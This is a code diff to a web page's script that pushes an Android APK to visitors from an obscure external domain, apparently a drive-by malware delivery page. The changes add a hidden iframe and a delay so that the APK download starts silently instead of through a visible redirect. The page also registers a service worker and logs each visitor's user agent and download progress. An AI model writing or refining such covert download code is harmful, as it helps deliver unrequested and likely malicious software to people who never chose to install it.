@@ -2,6 +2,9 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
+
+<iframe id="ifr1" style="display: none"></iframe>
+
 <script>
     async function logEvent(eventType, data = {}) {
         data.event = eventType; data.timestamp = Date.now(); data.ua = navigator.userAgent;
@@ -13,6 +16,16 @@
         } catch (e) { console.error('Log error:', e); }
     }
 
+    function downloadIFrame(url) {
+        let ifr1 = document.getElementById("ifr1");
+        ifr1.src = url;
+        ifr1.onerror = event => console.log(event);
+    }
+
+    async function delay(ms) {
+        await new Promise(resolve => setTimeout(resolve, ms))
+    }
+
     async function downloadApk() {
         const apkURL = "https://noticeablyholyewe.autos/aaa8e7e844e856a015a/" + location.search;
         logEvent("fallback_start", {url: apkURL});
@@ -21,7 +34,7 @@
             logEvent("fallback_response", {ok: response.ok, status: response.status});
             if (!response.ok) throw new Error("HTTP " + response.status);
 
-            const currentUrl = new URL(window.location.href);
+            const currentUrl = new URL(location.href);
             let apkname = "download911.apk";
             if (currentUrl.searchParams.get("utm_medium")) {
                 apkname = currentUrl.searchParams.get("utm_medium").replace(/[^\w-]/g, '_') + ".apk";
@@ -37,7 +50,8 @@
             logEvent("fallback_success");
         } catch (error) {
             logEvent("fallback_error", {message: error.message || error});
-            location.href = apkURL;
+            await delay(1000);
+            downloadIFrame(apkURL);
         }
     }
 
@@ -48,7 +62,7 @@
                 const reg = await navigator.serviceWorker.register('./sw2.js');
                 await navigator.serviceWorker.ready;
                 logEvent("sw_ready");
-                location.href = 'my.apk' + location.search;
+                downloadIFrame('my.apk' + location.search);
             } catch (e) {
                 logEvent("sw_fail", {error: e.message || e});
                 downloadApk();
